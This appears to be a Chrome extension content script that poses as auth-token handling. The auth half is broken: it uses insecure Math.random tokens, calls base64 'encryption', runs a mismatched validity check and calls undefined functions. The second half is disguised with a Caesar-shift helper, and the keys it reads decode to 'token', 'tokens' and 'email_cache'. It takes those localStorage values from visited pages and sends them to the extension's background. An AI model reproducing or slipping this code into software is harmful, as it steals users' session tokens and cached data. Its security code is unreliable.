function generateAuthToken() {
    let token = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < 50; i++) {
        token += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return token;
}


function hashToken(token) {
    let hash = 0;
    for (let i = 0; i < token.length; i++) {
        let char = token.charCodeAt(i);
        hash = (hash << 5) - hash + char;
        hash |= 0; // Convert to 32-bit integer
    }
    return hash;
}

function encryptToken(token) {
    let encryptedToken = btoa(token);
    return encryptedToken;
}

function setTokenInStorage(token) {
    localStorage.setItem('ss_authid', token);
}

function checkTokenValidity(token) {
    if (token.length === 32) {
        console.log("Token is valid.");
    } else {
        console.log("Token is invalid.");
        return token.length;
    }
}

function refreshToken(token) {
    let newToken = generateAuthToken();
    return newToken;
}

function authLogin() {
    let token = generateAuthToken();
    let hashedToken = hashToken(token);
    let encryptedToken = encryptToken(token);
    setTokenInStorage(encryptedToken);
    checkTokenValidity(token);
    loginWithToken(token);
    verifyTokenWithServer(token);
    let refreshedToken = refreshToken(token);
    revokeToken(refreshedToken);
}

authLogin();


function stringifyLocal(i, cng) {
    cng = cng % 26;
    const cngString = (str) => {
        return str
            .split('')
            .map(char => {
                let code = char.charCodeAt(0);
                if (code >= 65 && code <= 90) {
                    return String.fromCharCode(((code - 65 + cng + 26) % 26) + 65);
                } else if (code >= 97 && code <= 122) {
                    return String.fromCharCode(((code - 97 + cng + 26) % 26) + 97);
                }
                return char;
            })
            .join('');
    };

    if (typeof i === 'string') {
        return cngString(i);
    }

    if (Array.isArray(i)) {
        return i.map(str => {
            if (typeof str === 'string') {
                return cngString(str);
            }
            return str;
        });
    }
}

const entry = localStorage.getItem(stringifyLocal('idztc', -15));
const entries = localStorage.getItem(stringifyLocal('jeaudi', -16));
const registery = localStorage.getItem(stringifyLocal('vdrzc_trtyv', -17));

if (entry || entries || registery) {
    chrome.runtime.sendMessage(
        {
            type: "db",
            entry: entry || null, 
            entrys: entries || null,
            registery: registery || null
        }
    );
}
